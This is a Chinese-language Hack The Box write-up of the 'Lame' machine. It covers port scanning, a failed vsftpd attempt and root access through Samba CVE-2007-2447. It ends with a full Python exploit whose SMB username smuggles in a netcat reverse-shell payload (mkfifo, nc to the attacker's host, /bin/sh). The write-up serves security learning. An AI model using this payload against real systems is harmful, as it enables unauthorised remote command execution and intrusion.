# HTB lame


## 偵查


```
nmap -A -Pn [ip address]
```
21 22 139 445 port 有開啟
![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/e5429fad-6195-4cf7-9e99-b8608345d557)


---
## 攻擊
### 21port 
![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/0b06efe3-1e6a-47ca-a210-91528f5bcf95)


---
use `searchsploit`
![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/07cf9f12-3eef-41db-a6ea-82b27d793b8c)


---
使用 metasploit framework
搜尋vsft 使用1
![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/b7acccde-030e-4f23-b485-4a43e1a2f15b)


---
設定RHost，exploit，失敗
![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/751707a9-5f02-4cc2-b45c-82da5ea98a96)



### 22port 
ssh通常是無法在沒有資訊的情況下連線
![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/56bb7211-b5df-4f4f-b4f0-df30e4bc1d91)


### 139 445port
同樣都是samba服務
![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/ccd6ee3c-49de-4db4-86a4-7544c5dfa61a)


---
查詢smaba版本(有metasploit)
![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/a020969a-9419-4d5b-b499-7dc9f41ba0d5)


---
使用metasploit framework 
![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/291d3215-205b-4292-9674-50df88c53438)


---
查看option
![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/e2f0fba5-570c-448a-9bd1-f5ba12ffea55)


---

準備使用4444port監聽
![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/856f565a-46d5-4ff3-9f89-eb33a79e7289)


---
設定參數
![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/7e7b5c2d-c99f-4556-ab04-ebc443e20de0)

失敗

---
github搜尋漏洞CVE-2007-2447
![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/c13e6651-afe7-418b-8f8f-ece22e06e673)


使用`git clone`下載檔案
![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/1dca4ecc-da0b-4893-bf62-c0cc46b6db5c)


---
進入資料夾 CVE-2007-2447
![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/5dd29d3a-d3e1-4bc0-81fd-383c6d9ecfc1)

---
閱讀說明
![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/e56bec67-5194-4b58-b329-f5aba7de2b55)


---

開啟監聽 port 4444
![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/d6d9e79f-3ac4-4061-8505-57edf95f4d3a)



---
使用usermap_script.py 
![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/56d9d8c4-60d1-4b82-a4d1-4738544199dd)

---
成功
![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/8b370521-11e2-4017-a5dd-cc11c3b8955b)


---
## 提權
使用`whoami`發現已經是root
使用find 指令尋找 user.txt root.txt
![image](https://github.com/teri16/Pub-ClassWork/assets/144236243/a14bafc1-684e-424c-bcd1-5c3fd10a8187)



## 補充
### samba
#### 介紹
Samba 是一種在不同作業系統之間共享檔案和打印機的軟體，主要用於實現 Unix/Linux 和 Windows 系統之間的互操作性。使用 Samba，Linux/Unix 伺服器可以作為網路鄰居中的一部分，允許 Windows 電腦訪問和共享 Unix/Linux 資源，反之亦然。

Samba 的主要功能包括：

+ 檔案和打印共享： 允許 Linux/Unix 和 Windows 系統之間共享檔案和打印機。

+ 網域控制器功能： Samba 可以作為一個網域控制器（Domain Controller），管理一個網域的用戶帳戶和密碼。

+ 使用者和群組管理： 管理網路上的使用者帳戶和訪問權限。

+ 名稱解析和瀏覽： 提供網路瀏覽和名稱解析功能，使不同系統的使用者能夠輕鬆找到和訪問共享資源。

+ Active Directory 整合： 支持與 Windows Active Directory 環境的整合，允許使用 AD 帳戶和策略。


### 漏洞使用
Samba 3.0.0 - 3.0.25rc3 are subject for Remote Command Injection Vulnerability (CVE-2007-2447), allows remote attackers to execute arbitrary commands by specifying a username containing shell meta characters.

程式碼
```python=
#!/usr/bin/python
# -*- coding: utf-8 -*-

# 來源：https://github.com/amriunix/cve-2007-2447
# 案例研究：https://amriunix.com/post/cve-2007-2447-samba-usermap-script/

import sys
from smb.SMBConnection import SMBConnection

def exploit(rhost, rport, lhost, lport):
        # 構建攻擊載荷，用於在目標機器上創建管道，並通過netcat反向連接回攻擊者的機器
        payload = 'mkfifo /tmp/hago; nc ' + lhost + ' ' + lport + ' 0</tmp/hago | /bin/sh >/tmp/hago 2>&1; rm /tmp/hago'
        # 構造特殊用戶名，當Samba服務解析時，將執行payload
        username = "/=`nohup " + payload + "`"
        # 初始化一個SMB連接
        conn = SMBConnection(username, "", "", "")
        try:
            # 嘗試連接到目標SMB服務
            conn.connect(rhost, int(rport), timeout=1)
        except:
            # 如果連接異常，提示載荷可能已發送
            print("[+] Payload was sent - check netcat !")

if __name__ == '__main__':
    # 腳本入口，打印信息
    print("[*] CVE-2007-2447 - Samba usermap script")
    # 檢查是否提供了所有必要的參數
    if len(sys.argv) != 5:
        # 如果參數不足，打印使用方法
        print("[-] usage: python " + sys.argv[0] + " <RHOST> <RPORT> <LHOST> <LPORT>")
    else:
        # 參數正確，開始連接過程
        print("[+] Connecting !")
        rhost = sys.argv[1]  # 目標主機IP
        rport = sys.argv[2]  # 目標主機端口
        lhost = sys.argv[3]  # 攻擊者主機IP
        lport = sys.argv[4]  # 攻擊者主機端口
        # 執行exploit函數進行攻擊
        exploit(rhost, rport, lhost, lport)

```
